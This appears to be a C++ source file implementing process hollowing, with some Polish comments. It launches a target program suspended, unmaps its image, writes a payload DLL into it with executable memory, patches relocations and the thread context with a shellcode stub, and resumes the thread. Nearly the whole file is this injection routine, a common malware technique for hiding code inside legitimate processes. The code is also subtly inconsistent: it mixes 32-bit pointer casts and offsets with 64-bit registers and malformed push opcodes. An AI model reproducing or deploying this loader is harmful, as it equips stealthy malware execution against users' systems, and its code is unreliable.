#include "InjectTools.h"


DWORD ConvertVirtualVirtualAddress2RawAddress(DWORD virtualAddress, LPVOID file) {
	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)file;
	PIMAGE_SECTION_HEADER section = (PIMAGE_SECTION_HEADER)((DWORD)file + dosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS32));

	while (virtualAddress > section->VirtualAddress + section->Misc.VirtualSize) section++;

	DWORD offset = virtualAddress - section->VirtualAddress;
	DWORD rawAddress = offset + section->PointerToRawData;
	return rawAddress;
}

namespace InjectTools {
	int AutoInject(LPSTR target, LPCSTR payload) {
		HMODULE hNtDll = GetModuleHandleA("ntdll.dll");
		LPSTARTUPINFOA startupInfo = new STARTUPINFOA();
		LPPROCESS_INFORMATION processInformation = new PROCESS_INFORMATION();
		PROCESS_BASIC_INFORMATION* processBasicInformation = new PROCESS_BASIC_INFORMATION();

		BOOL processCreated = CreateProcessA(NULL, target, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, startupInfo, processInformation);
		if (processCreated) {
			HANDLE targetProcess = processInformation->hProcess;
			if (targetProcess != INVALID_HANDLE_VALUE) {
				DWORD returnLength = 0;
				NtQueryInformationProcess(targetProcess, ProcessBasicInformation, processBasicInformation, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);

				DWORD imageBaseOffset = (DWORD)processBasicInformation->PebBaseAddress + 8;
				LPVOID destiationImageBase = 0; 
				SIZE_T bytesRead = NULL; 
				BOOL processRead = ReadProcessMemory(targetProcess, (LPCVOID)imageBaseOffset, &destiationImageBase, 4, &bytesRead); 
				if (processRead && destiationImageBase != ERROR) { 
					HANDLE dllFile = CreateFileA(payload, GENERIC_READ, NULL, NULL, OPEN_ALWAYS, NULL, NULL); 
					if (dllFile != INVALID_HANDLE_VALUE) { 
						DWORD dllSize = GetFileSize(dllFile, NULL); 
						LPDWORD fileBytesRead = 0; 
						LPVOID dllBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dllSize);
						if (dllBuffer != ERROR) {
							DWORD ss = 0;
							BOOL dllRead = ReadFile(dllFile, dllBuffer, dllSize, &ss, NULL);

							if (dllRead) {
								PIMAGE_DOS_HEADER dllImageDosHeader = (PIMAGE_DOS_HEADER)dllBuffer;
								PIMAGE_NT_HEADERS dllImageNtHeader = (PIMAGE_NT_HEADERS)((DWORD)dllBuffer + dllImageDosHeader->e_lfanew);
								SIZE_T dllImageSize = dllImageNtHeader->OptionalHeader.SizeOfImage;

								NtUnmapViewOfSection unmapSection = (NtUnmapViewOfSection)(GetProcAddress(hNtDll, "NtUnmapViewOfSection"));

								if (NT_SUCCESS(unmapSection(targetProcess, destiationImageBase))) {
									LPVOID newDestiationImageBase = VirtualAllocEx(targetProcess, destiationImageBase, dllImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
									destiationImageBase = newDestiationImageBase;

									DWORD deltaImageBase = (DWORD)destiationImageBase - dllImageNtHeader->OptionalHeader.ImageBase;
									dllImageNtHeader->OptionalHeader.ImageBase = (DWORD)destiationImageBase;
									WriteProcessMemory(targetProcess, newDestiationImageBase, dllBuffer, dllImageNtHeader->OptionalHeader.SizeOfHeaders, NULL);

									PIMAGE_SECTION_HEADER dllImageSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD)dllBuffer + dllImageDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS32));
									PIMAGE_SECTION_HEADER oldDllImageSectionHeader = dllImageSectionHeader;

									for (int i = 0; i < dllImageNtHeader->FileHeader.NumberOfSections; i++) {
										PVOID destinationSectionLocation = (PVOID)((DWORD)destiationImageBase + dllImageSectionHeader->VirtualAddress);
										PVOID sourceSectionLocation = (PVOID)((DWORD)dllBuffer + dllImageSectionHeader->PointerToRawData);
										WriteProcessMemory(targetProcess, destinationSectionLocation, sourceSectionLocation, dllImageSectionHeader->SizeOfRawData, NULL);
										dllImageSectionHeader++;
									}

									PIMAGE_EXPORT_DIRECTORY imageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((DWORD)dllBuffer + ConvertVirtualVirtualAddress2RawAddress((DWORD)dllImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress, dllBuffer));
									PDWORD pEAT = (DWORD*)((DWORD)dllBuffer + ConvertVirtualVirtualAddress2RawAddress(imageExportDirectory->AddressOfFunctions, dllBuffer));

									IMAGE_DATA_DIRECTORY relocationTable = dllImageNtHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
									dllImageSectionHeader = oldDllImageSectionHeader;

									for (int j = 0; j < dllImageNtHeader->FileHeader.NumberOfSections; j++) {
										BYTE* relockSectionName = (BYTE*)".reloc";
										if (memcmp(dllImageSectionHeader->Name, relockSectionName, 5) != 0) {
											dllImageSectionHeader++;
											continue;
										}
										DWORD sourceRelocationTableRaw = dllImageSectionHeader->PointerToRawData;
										DWORD relocationOffset = 0;

										while (relocationOffset < relocationTable.Size) {
											PBASE_RELOCATION_BLOCK relocationBlock = (PBASE_RELOCATION_BLOCK)((DWORD)dllBuffer + sourceRelocationTableRaw + relocationOffset);
											relocationOffset += sizeof(BASE_RELOCATION_BLOCK);
											DWORD relocationCounts = (relocationBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
											PBASE_RELOCATION_ENTRY relocationEntries = (PBASE_RELOCATION_ENTRY)((DWORD)dllBuffer + sourceRelocationTableRaw + relocationOffset);

											for (DWORD a = 0; a < relocationCounts; a++) {
												relocationOffset += sizeof(BASE_RELOCATION_ENTRY);
												if (relocationEntries[a].Type == 0) {
													continue;
												}

												DWORD patchedAddress = relocationBlock->PageAddress + relocationEntries[a].Offset;
												DWORD patchedBuffer = 0;

												ReadProcessMemory(targetProcess, (LPCVOID)((DWORD)destiationImageBase + patchedAddress), &patchedBuffer, sizeof(DWORD), &bytesRead);
												patchedBuffer += deltaImageBase;
												WriteProcessMemory(targetProcess, (PVOID)((DWORD)destiationImageBase + patchedAddress), &patchedBuffer, sizeof(DWORD), NULL);
											}
										}
									}

									LPCONTEXT context = new CONTEXT();
									context->ContextFlags = CONTEXT_INTEGER;
									GetThreadContext(processInformation->hThread, context);

									BYTE code[] = {
										0x68, 0xDD, 0xDD, 0xDD, 0xDD, 0xDD, 0xDD, 0xDD, 0xDD,        // push 0xDDDDDDDDDDDDDDDD
										0x68, 0xDD, 0xDD, 0xDD, 0xDD, 0xDD, 0xDD, 0xDD, 0xDD,        // push 0xDDDDDDDDDDDDDDDD
										0x68, 0xDD, 0xDD, 0xDD, 0xDD, 0xDD, 0xDD, 0xDD, 0xDD,        // push 0xDDDDDDDDDDDDDDDD
										0x68, 0xDD, 0xDD, 0xDD, 0xDD, 0xDD, 0xDD, 0xDD, 0xDD,        // push 0xDDDDDDDDDDDDDDDD
										0x48, 0xB8, 0xDD, 0xDD, 0xDD, 0xDD, 0xDD, 0xDD, 0xDD, 0xDD,  // mov rax, 0xDDDDDDDDDDDDDDDD
										0xFF, 0xE0                                                   // jmp rax
									};

									// Ustawianie parametr�w za pomoc� PULONGLONG dla 64-bitowych warto�ci 
									*((PULONGLONG)(code + 1)) = 0;                                         // 3rd param dla DllMain 
									*((PULONGLONG)(code + 10)) = 1;                                        // 2nd param dla DllMain 
									*((PULONGLONG)(code + 19)) = (ULONGLONG)destiationImageBase;           // 1st param dla DllMain 
									*((PULONGLONG)(code + 28)) = (ULONGLONG)destiationImageBase + pEAT[1]; // Funkcja eksportowana 
									*((PULONGLONG)(code + 37)) = (ULONGLONG)destiationImageBase + dllImageNtHeader->OptionalHeader.AddressOfEntryPoint; // Punkt wej�cia 

									// Alokacja pami�ci z poprawnymi flagami
									LPVOID addressBuffer = VirtualAllocEx(targetProcess, NULL, sizeof(code), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
									if (addressBuffer != NULL) {
										BOOL success = WriteProcessMemory(targetProcess, addressBuffer, code, sizeof(code), NULL);
										if (success) {
											context->Rax = (ULONGLONG)addressBuffer; 

											SetThreadContext(processInformation->hThread, context);
											ResumeThread(processInformation->hThread);
										}
									}

									return 0;
								}
							}
						}
					}
					CloseHandle(dllFile);
				}
			}
			CloseHandle(targetProcess);
		}
	}
}